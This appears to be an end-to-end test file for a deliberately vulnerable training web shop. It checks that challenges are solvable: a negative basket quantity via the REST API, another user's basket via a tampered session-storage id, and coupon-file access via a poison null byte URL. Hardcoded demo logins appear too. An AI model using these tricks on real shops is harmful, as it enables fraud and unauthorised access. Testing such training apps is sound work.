const insecurity = require('../../lib/insecurity')
const config = require('config')

describe('/#/basket', () => {
  describe('as admin', () => {
    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

    describe('challenge "negativeOrder"', () => {
      it('should be possible to update a basket to a negative quantity via the Rest API', () => {
        browser.waitForAngularEnabled(false)
        browser.executeScript('var $http = angular.injector([\'ng\']).get(\'$http\'); $http.put(\'/api/BasketItems/1\', {quantity: -100000});')
        browser.driver.sleep(1000)
        browser.waitForAngularEnabled(true)

        browser.get('/#/basket')

        const productQuantities = element.all(by.repeater('product in products').column('BasketItem.quantity'))
        expect(productQuantities.first().getText()).toMatch(/-100000/)
      })

      it('should be possible to place an order with a negative total amount', () => {
        element(by.id('checkoutButton')).click()
      })

      protractor.expect.challengeSolved({challenge: 'Payback Time'})
    })

    describe('challenge "accessBasket"', () => {
      it('should access basket with id from session storage instead of the one associated to logged-in user', () => {
        browser.executeScript('window.sessionStorage.bid = 3;')

        browser.get('/#/basket')

        // TODO Verify functionally that it's not the basket of the admin
      })

      protractor.expect.challengeSolved({challenge: 'Basket Access'})
    })
  })

  describe('as jim', () => {
    protractor.beforeEach.login({email: 'jim@' + config.get('application.domain'), password: 'ncc-1701'})

    describe('challenge "forgedCoupon"', () => {
      it('should be able to access file /ftp/coupons_2013.md.bak with poison null byte attack', () => {
        browser.driver.get(browser.baseUrl + '/ftp/coupons_2013.md.bak%2500.md')
      })

      it('should be possible to enter a coupon that gives an 80% discount', () => {
        browser.executeScript('window.localStorage.couponPanelExpanded = false;')

        browser.get('/#/basket')
        element(by.id('collapseCouponButton')).click()
        browser.wait(protractor.ExpectedConditions.presenceOf($('#coupon')), 5000, 'Coupon textfield not present.') // eslint-disable-line no-undef

        element(by.model('coupon')).sendKeys(insecurity.generateCoupon(90))
        element(by.id('applyCouponButton')).click()
      })

      it('should be possible to place an order with a forged coupon', () => {
        element(by.id('checkoutButton')).click()
      })

      protractor.expect.challengeSolved({challenge: 'Forged Coupon'})
    })
  })
})
